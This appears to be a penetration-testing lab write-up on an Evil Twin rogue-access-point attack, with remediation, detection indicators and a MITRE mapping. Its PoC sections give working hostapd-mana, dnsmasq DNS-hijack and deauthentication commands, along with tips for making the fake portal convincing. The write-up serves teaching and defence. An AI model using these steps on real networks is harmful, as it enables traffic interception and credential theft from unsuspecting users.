> **English** | [Italiano](README.md)

# Rogue AP & evil twin - credential harvesting via fake access point

> - **Phase:** Wireless Security - Initial Access & Credential Access (Adversary-in-the-Middle)
> - **Visibility:** High - the creation of a fake AP transmits detectable Beacon frames; the deauth of the legitimate network generates anomalous traffic; a WIPS detects the duplicate BSSID with identical ESSID on a different MAC
> - **Prerequisites:** WiFi card with AP mode + injection support; knowledge of the target ESSID (from `../recon-monitor/`); secondary interface for the Internet uplink (optional, for a functional captive portal)
> - **Output:** WIFI-004; WPA2/portal credentials captured in cleartext; Man-in-the-Middle session on the victims' traffic; possibility of serving payloads via captive portal

- **Operating Environment:** Kali Linux (Attacker), 2 WiFi interfaces (one AP mode, one monitor), lab network
- **Target:** Fictitious clients looking for the `LAB-CORP` network
- **Main tools:** hostapd-mana, dnsmasq, Airgeddon (integrated Evil Twin framework)

---

## Executive summary

The Evil Twin is the wireless attack that does not attack the network, but its users. Instead of cracking the PSK (module `../cracking/`), the attacker creates a clone access point - same ESSID, stronger signal - and induces the clients to connect to it instead of the legitimate AP. From that Man-in-the-Middle position, the attacker intercepts or manipulates all the traffic, and via a forged captive portal collects credentials directly.

This technique is particularly insidious because it shifts the weak point from the technology to the user: it requires no cryptographic vulnerability. Even a WPA2 network with a very robust PSK is vulnerable if a user can be convinced to type the password (or the corporate portal credentials) into a page that looks legitimate. Finding WIFI-004 is classified `Critical` because it produces directly usable credentials and a complete MITM position.

The "Mana" variant (hostapd-mana) automates the attack by responding to all the clients' Probe Requests, simultaneously impersonating every network the devices are looking for (KARMA attack): a device looking for the home or office network connects automatically to the rogue AP.

---

## Folder structure

```
rogue-ap/
+-- README.md      # this file: Evil Twin + captive portal credential harvest (WIFI-004)
+-- img/           # captive portal screenshots and captured credentials
```

---

## Evil twin with captive portal

**Finding ID:** `WIFI-004` | **Severity:** `Critical` (credential harvesting + complete Man-in-the-Middle position on the victims' traffic)

### Operational context

The classic Evil Twin attack combines three elements: (1) a fake AP with the same ESSID as the target, (2) a deauthentication attack against the legitimate AP to push the clients to look for an alternative, (3) a captive portal that simulates a re-authentication page and captures the typed credentials. The victim, disconnected from the real network, sees the fake AP with a strong signal, connects, and receives a "enter the WiFi password to continue" page.

### PoC - phase 1: fake AP setup

```Bash
# hostapd-mana configuration for the clone AP
cat > /tmp/mana.conf <<'EOF'
interface=wlan1
ssid=LAB-CORP
channel=6
hw_mode=g
# mana mode: responds to all probes (KARMA)
enable_mana=1
mana_loud=1
EOF

sudo hostapd-mana /tmp/mana.conf
```

```
wlan1: interface state UNINITIALIZED->ENABLED
wlan1: AP-ENABLED
mana: Directed probe request for SSID 'LAB-CORP' from A0:B1:C2:D3:E4:F5   <-- client attracted
mana: Responding with our BSSID
```

### PoC - phase 2: DHCP and DNS hijacking

```Bash
# dnsmasq: assigns IP and redirects all DNS queries to the captive portal
cat > /tmp/dnsmasq.conf <<'EOF'
interface=wlan1
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
address=/#/10.0.0.1
EOF

sudo dnsmasq -C /tmp/dnsmasq.conf -d
```

### PoC - phase 3: deauthentication of the legitimate network

```Bash
# Pushes the clients to disconnect from the real AP (on a separate monitor interface)
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### PoC - phase 4: credential capture from the captive portal

```
[+] Client connected: A0:B1:C2:D3:E4:F5 -> 10.0.0.15
[+] HTTP GET / -> redirect to captive portal ("WiFi re-authentication required" page)
[+] HTTP POST /login
        wifi_password=Password123!                          <-- credentials captured (WIFI-004)
        user=m.rossi
[+] PSK verification against real handshake: VALID
[+] Client released toward Internet (no suspicion)
```

After the capture, the portal validates the password against the real handshake captured previously (to confirm correctness) and releases the client toward a working connection, avoiding the victim suspecting the attack.

### Remediation

- **Immediate action:** train users to never enter the WiFi password in a browser (a legitimate AP never requests it via captive portal for reconnection); verify the presence of duplicate BSSIDs with a WIDS
- **Structural action:** deploy WPA3-SAE or 802.1X with mutual server authentication (EAP-TLS): with server certificate validation, the client automatically rejects a fake AP that does not possess the legitimate certificate. This is the only control that structurally neutralizes the Evil Twin; enable PMF (802.11w) to limit deauths
- **Verification:** a WIPS must detect and alert on APs with the corporate ESSID but an unauthorized BSSID (rogue AP detection); periodic testing with Airgeddon in a controlled environment

---

## Automation with airgeddon

### Operational context

Airgeddon is a bash framework that orchestrates the entire Evil Twin attack from an interactive menu, automatically handling the AP creation, the DHCP, the multilingual captive portal and the deauthentication. In the lab it was used to quickly validate the scenario without manually configuring hostapd and dnsmasq.

```Bash
sudo airgeddon
# Menu: Evil Twin attacks -> Evil Twin AP with captive portal
# Airgeddon handles: clone AP + deauth + DHCP + portal + PSK validation
```

---

## Lab experience

The main difficulty was not technical but of "direction": for the victim to connect to the rogue AP and type the password, the deauthentication of the legitimate AP must be aggressive and continuous (`--deauth 0`), otherwise the client tends to reconnect to the real AP which has a comparable signal. In the lab, physically bringing the attacker card closer to the client (increasing the relative RSSI of the rogue AP) was more effective than any software parameter: the Evil Twin attack is first of all a matter of signal power.

The second critical element was the realism of the captive portal. A generic "enter password" portal has a low yield; a portal that replicates the exact branding of the target network (logo, colors, text in Italian consistent with the corporate context) drastically increases the probability that the user trusts it. Airgeddon includes multilingual templates precisely for this reason. This observation confirms that the Evil Twin is, in fact, a social engineering attack delivered over a radio layer.

---

## Theoretical analysis: why mutual authentication solves the problem

The Evil Twin works because in WPA2-PSK and WPA2-Enterprise with server validation disabled, the authentication is unidirectional or based on a shared secret: the client proves to the AP that it knows the password, but does not verify in a cryptographically strong way the identity of the AP. An attacker who knows the ESSID can therefore impersonate the network.

WPA2/WPA3-Enterprise with EAP-TLS solves the problem at the root via mutual authentication: the RADIUS server presents an X.509 certificate, and the client (if correctly configured to validate it) verifies that the certificate is signed by a trusted CA and corresponds to the expected identity. An Evil Twin does not possess the private key of the legitimate certificate, so it cannot complete the TLS handshake: the client refuses to connect. The widespread weak point is the client configuration that skips certificate validation ("connect anyway"), reopening the vector.

WPA3-SAE adds a further level: the Dragonfly protocol provides mutual authentication based on the PSK without exposing it, making an Evil Twin incapable of completing the SAE handshake without already knowing the password. This is why the migration to WPA3 and to EAP-TLS with mandatory server validation is the structural countermeasure, while user training is only a palliative.

---

## Real-World scenario: Post-Exploitation projection

> This section describes how this finding would fit into a real engagement, from both the attacker (Red Team) and defender (Blue Team) perspectives.

### Attacker perspective (red team)

**Starting point:** Man-in-the-Middle position on the traffic of one or more victims + captured captive portal credentials (WIFI-004).

**Immediate next step:** interception of unprotected HTTP/HTTPS sessions and injection of payloads; use of the captured credentials on corporate services (SSO, VPN, webmail).

**Projected kill chain:**

```
[WIFI-004] Evil Twin: MITM + portal credentials
        |
        v
SSLstrip / downgrade + session sniffing -> cookies, tokens
        |
        v
Credential reuse on corporate VPN/SSO -> legitimate remote access
        |
        v
Serving payload via captive portal ("update required") -> RCE on endpoint
        |
        v
Internal foothold -> lateral movement (07-post-exploitation)
```

**Potential impact:** the Evil Twin combines credential harvesting, MITM and malware delivery in a single vector. In high-value contexts (conferences, airports, corporate sites), a rogue AP with a plausible ESSID ("Airport_Free_WiFi", corporate ESSID) can compromise dozens of devices in a few hours. The captured credentials directly fuel `05-social-engineering/` (credential reuse) and the payload serving links to `04-system-exploitation/`.

### Defender perspective (blue team)

**Detection:** a WIPS detects the appearance of a second BSSID transmitting the corporate ESSID. The pattern of massive deauth flood toward the legitimate AP is a second strong indicator. On the client side, MDM systems can detect the connection to an unauthorized BSSID.

**Indicators of Compromise (IOC):**
- BSSID not present in the inventory transmitting the corporate ESSID
- Deauth flood (deauth code 7, broadcast) toward the legitimate AP
- Corporate clients obtaining a gateway/DNS different from the expected one
- Invalid RADIUS server certificate presented to 802.1X clients (Enterprise Evil Twin attempt)

**Containment:** physical localization of the rogue AP (RSSI triangulation); blocking of the BSSID at the WIPS level with active countermeasures (deauth of the rogue); notification to the users in the area.

**Eradication and hardening:**
- EAP-TLS with mandatory server certificate validation on the client side (via GPO/MDM)
- WPA3-SAE where the device fleet supports it
- WIPS with automatic rogue AP containment
- Awareness: users must never enter credentials in captive portals for known corporate networks

**Defensive lesson:** trust must be mutual and cryptographically verifiable. A network that asks the client to authenticate but does not prove its own identity to the client is structurally vulnerable to impersonation. The server certificate (EAP-TLS) is the mechanism that makes the client capable of recognizing and rejecting an impostor.

---

## Reference tools

| tool | type | technique/access | main use case |
| :--- | :--- | :--- | :--- |
| `hostapd-mana` | rogue ap daemon | cli | creation of a fake ap with karma (response to all probes) |
| `dnsmasq` | dhcp/dns server | cli | ip assignment and dns hijacking toward the captive portal |
| `Airgeddon` | evil twin framework | cli - menu | complete evil twin orchestration + multilingual captive portal |
| `hostapd-wpe` | enterprise rogue | cli | evil twin for wpa2-enterprise (eap challenge/response capture) |
| `eaphammer` | enterprise attack | cli - python | modern attack on 802.1x networks with gtc downgrade and credential capture |
| `bettercap` | mitm framework | cli | post-association sniffing and injection on the victims' traffic |

> **Recommended modern tool:** `eaphammer` (Gabriel Ryan) is the 2024-2026 standard for attacking WPA2-Enterprise networks: it automates the Evil Twin with downgrade to EAP-GTC to capture cleartext credentials when client-side certificate validation is absent or misconfigured.

---

## MITRE ATT&CK mapping

| tactic | technique | mitre id | action description |
| :--- | :--- | :--- | :--- |
| credential access | adversary-in-the-middle: evil twin | `T1557.004` | creation of a fake ap with a cloned essid to intercept the traffic and credentials of the clients (WIFI-004) |
| collection | adversary-in-the-middle | `T1557` | man-in-the-middle position on the traffic of the victims connected to the rogue ap |
| credential access | input capture: web portal capture | `T1056.003` | capture of credentials via forged captive portal (WIFI-004) |
| initial access | hardware additions | `T1200` | introduction of an unauthorized radio device (rogue ap) into the target environment |
| initial access | valid accounts | `T1078` | reuse of the captured credentials to access corporate services |

---

> **Note:** All documented activities were conducted on a lab WiFi network owned by the author, with fictitious test clients. The creation of fake access points and the deauthentication were confined to the isolated radio environment of the lab. The impersonation of WiFi networks and the interception of third-party traffic without authorization are crimes. Techniques are documented for educational and authorized security assessment purposes.
